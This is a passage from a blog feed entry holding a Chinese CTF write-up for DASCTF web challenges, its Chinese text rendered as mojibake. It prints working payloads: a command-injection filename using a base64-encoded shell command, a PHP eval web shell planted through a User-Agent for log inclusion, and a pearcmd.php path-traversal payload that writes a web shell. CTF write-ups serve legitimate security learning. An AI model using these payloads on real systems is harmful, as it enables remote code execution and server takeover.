class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡å·²åˆ é™¤!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span></span><br><span class="line"><span class="language-php">          &#125;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>åˆ†ææºç </p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœä¸å­˜åœ¨session[<span class="string">&#x27;user&#x27;</span>]ï¼Œå‡ºç°ç™»å½•è¡¨å•ï¼Œæäº¤è¡¨å•ä¹‹åå°±ä¼šç»™session[<span class="string">&#x27;user&#x27;</span>]è¿›è¡Œèµ‹å€¼ã€‚</span><br><span class="line">ç¬¬ä¸€æ¬¡ç™»å½•åå†å›åˆ°åŸè¡¨å•å°±ä¼šè§¦å‘jsæç¤ºä¸æ˜¯<span class="literal">admin</span>ï¼Œå¹¶è·å¾—æºç æ–‡ä»¶çš„ä½ç½®ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªif</span><br><span class="line"></span><br><span class="line">å¦‚æœä¸å­˜åœ¨<span class="keyword">file</span>ï¼Œé‚£å°±è§¦å‘æ–‡ä»¶ä¸Šä¼ è¡¨å•ï¼Œactionä¸ºindex.phpï¼Œå¦‚æœå­˜åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯¹æ–‡ä»¶åç¼€è¿›è¡Œåˆ¤æ–­å¹¶è¿”å›ä¸Šä¼ æˆåŠŸæç¤º</span><br><span class="line">å¦‚æœå­˜åœ¨<span class="keyword">file</span>ï¼Œé‚£ä¹ˆå°±å°†æ–‡ä»¶åèµ‹å€¼ç»™<span class="variable">$filename</span>ï¼Œç„¶åå¼•ç”¨<span class="keyword">FILE</span>ç±»å¯¹æ–‡ä»¶åè¿›è¡Œå¤„ç†ï¼Œconstructä¸»è¦æ˜¯è¿‡æ»¤äº†/å’Œå¤šä¸ª.ï¼Œä¸”åˆ¤æ–­äº†æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œ<span class="params">system</span>å‡½æ•°</span><br></pre></td></tr></table></figure><p>å…·ä½“æ“ä½œ<img src="../ç¬”è®°å›¾/image-20230722205634843.png" alt=""></p><p><img src="../ç¬”è®°å›¾/image-20230722205650142.png" alt="image-20230722205650142"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://2f3204e1-d884-4172-86aa-0ac751e580de.node4.buuoj.cn:81/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>ç”¨æˆ·åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>å¯†ç ï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å†™è¡¨å•è¿›è¡Œç™»å½•å’Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ æ–‡ä»¶ä¹‹åå†ç”¨å¦ä¸€ä¸ªç•Œé¢è¿›è¡Œ<span class="built_in">get</span>ä¼ <span class="built_in">file</span>ï¼Œä¼ å…¥çš„<span class="built_in">file</span>åå¿…é¡»å’Œä¸Šä¼ çš„æ–‡ä»¶åæ˜¯ä¸€æ ·çš„ï¼Œè¿›è€Œè§¦å‘<span class="keyword">system</span>å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line">ç”±äºå¯¹/å’Œ.å…·æœ‰ä¸¥æ ¼è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨ç¼–ç ç»•è¿‡</span><br><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br><span class="line">bpä¼ å‚éœ€è¦æŠŠç©ºæ ¼æ”¹ä¸º+å·</span><br></pre></td></tr></table></figure><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœ‹åˆ°æ˜¯ä¸ªç½‘é¡µç›´æ¥ç›²çŒœä¸€æ‰‹åå°ç®¡ç†ç•Œé¢/adminï¼Œç„¶åå¼±å£ä»¤è¯•äº†ä¸€ä¸‹å°±è¿›å»äº†</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20230722211756542.png" alt="image-20230722211756542"></p><p>è¿™é‡Œæ˜¯æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œbutå¥½åƒæ²¡ä»€ä¹ˆåµç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åå°±æƒ³æ˜¯å¦å¯ä»¥è¿›è¡Œæ—¥å¿—åŒ…å«</span><br><span class="line">æ·»åŠ UAï¼š<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chuling]); <span class="meta">?&gt;</span></span><br><span class="line">ç„¶åè®¿é—®url:   url/admin/r=../../../../../../<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">ç”¨èšå‰‘å°è¯•è¿æ¥ï¼Œç»“æœå¤±è´¥äº†ã€‚</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™å°±åˆæ¥äº†ä¸€ä¸ªpearcmd.phpæ–‡ä»¶åŒ…å«</p><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">https://blog.csdn.net/Mrs_H/article/details/122386511</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å…·ä½“æ“ä½œä¸º?+config-create+<span class="regexp">/&amp;r=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/share/</span>php<span class="regexp">/pearcmd&amp;/</span>&lt;?=eval(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>chuling2.php</span><br><span class="line"></span><br><span class="line">æˆåŠŸä¹‹åç›´æ¥èšå‰‘è¿æ¥å¾—åˆ°flag</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20230722214619617.png" alt="image-20230722214619617"></p>]]></content>
    
    
    <summary type="html">DASCTF wpæ¥å’¯~ web 3/5</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
</feed>
